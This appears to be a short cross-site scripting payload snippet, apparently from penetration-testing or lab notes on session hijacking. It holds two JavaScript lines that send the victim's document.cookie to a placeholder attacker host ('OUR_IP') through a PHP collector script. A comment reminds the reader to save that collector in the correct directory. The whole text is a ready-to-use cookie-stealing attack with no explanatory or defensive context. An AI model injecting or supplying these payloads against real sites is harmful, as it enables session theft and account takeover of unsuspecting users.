//Make sure the sessionhijacking-index.php is saved in the correct dir by checking the pwd. 

document.location='http://OUR_IP/sessionhijacking-index.php?c='+document.cookie;
new Image().src='http://OUR_IP/sessionhijacking-index.php?c='+document.cookie;